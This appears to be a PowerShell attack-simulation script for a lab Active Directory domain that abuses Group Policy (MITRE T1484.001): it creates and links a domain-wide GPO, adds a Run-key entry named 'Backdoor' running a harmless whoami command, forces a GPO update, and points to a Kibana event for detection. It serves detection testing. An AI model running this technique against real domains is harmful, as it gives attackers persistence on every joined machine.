# Attack Simulation: GPO Abuse
# MITRE ATT&CK: T1484.001
# Usage: Run on DC01 as Administrator

$GPOName = "MaliciousGPO"

Write-Host "[*] Creating malicious GPO: $GPOName"
New-GPO -Name $GPOName | New-GPLink -Target "DC=lab,DC=local"

Write-Host "[*] Adding persistence via Run key..."
Set-GPRegistryValue -Name $GPOName `
    -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
    -ValueName "Backdoor" `
    -Type String `
    -Value "cmd.exe /c whoami > C:\pwned.txt"

Write-Host "[*] Forcing GPO update on domain..."
Invoke-GPUpdate -Force

Write-Host "[*] Attack complete - check Kibana for Event ID 5136 with ObjectDN containing 'policies'"
